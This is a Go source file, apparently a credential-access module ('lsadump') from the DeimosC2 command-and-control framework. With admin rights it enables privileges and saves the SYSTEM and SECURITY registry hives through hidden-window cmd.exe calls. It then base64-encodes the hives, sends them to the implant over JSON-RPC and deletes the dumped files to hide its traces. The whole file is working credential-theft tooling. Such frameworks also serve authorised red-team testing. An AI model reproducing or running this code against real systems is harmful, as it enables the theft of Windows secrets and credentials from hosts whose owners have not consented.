package main

import (
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"log"
	"net"
	"net/rpc/jsonrpc"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"syscall"
	"time"

	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
	"github.com/DeimosC2/DeimosC2/lib/privileges"
)

type downloadFiles struct {
	Systemfile string
	Systemdata string
	Secfile    string
	Secdata    string
}

//This lsadump function will extract the LSA Secrets from memory and/or pull just the necessary registry keys
func runModule(port string) {
	//Hardcoded and needs to be fixed long term along with other modules
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("Dialing:", err)
	}
	defer conn.Close()

	client := jsonrpc.NewClient(conn)

	admin, _ := privileges.AdminOrElevated()
	if admin == true {
		privileges.SePrivEnable()
		cmdName := "cmd.exe"
		sysFile := path.Join("C:", "Windows", "system")
		secFile := path.Join("C:", "Windows", "security")

		cmdArgs := []string{"/c", "reg.exe save HKLM\\SYSTEM " + sysFile}
		cmd := exec.Command(cmdName, cmdArgs...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()

		cmdArgs2 := []string{"/c", "reg.exe save HKLM\\SECURITY " + secFile}
		cmd2 := exec.Command(cmdName, cmdArgs2...)
		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd2.Run()

		sysData, err := ioutil.ReadFile(sysFile)
		if err != nil {
			logging.Logger.Println(err)
		}

		secData, err := ioutil.ReadFile(secFile)
		if err != nil {
			logging.Logger.Println(err)
		}

		downloadStruct := downloadFiles{
			Systemfile: filepath.Base(sysFile),
			Systemdata: base64.StdEncoding.EncodeToString(sysData),
			Secfile:    filepath.Base(secFile),
			Secdata:    base64.StdEncoding.EncodeToString(secData),
		}

		sendData, err := json.Marshal(downloadStruct)

		var reply int
		sendon := modulescommon.ModuleCom{"", true, false, false, "lsadump", "credential_access", ".exe", sendData}
		err = client.Call("ModData.SendData", &sendon, &reply)
		if err != nil {
			log.Fatal("RPC error: ", err)
		}

		time.Sleep(3 * time.Second)

		err = os.Remove(sysFile)
		if err != nil {
			log.Fatal(err)
		}

		err = os.Remove(secFile)
		if err != nil {
			log.Fatal(err)
		}

		sendon = modulescommon.ModuleCom{"", true, false, true, "lsadump", "credential_access", ".exe", nil}

		err = client.Call("ModData.SendData", &sendon, &reply)
		if err != nil {
			log.Fatal("RPC error: ", err)
		}

	} else {
		logging.Logger.Println("You must be an admin for this to run!")
	}
}

func main() {
	runModule(os.Args[1])
}
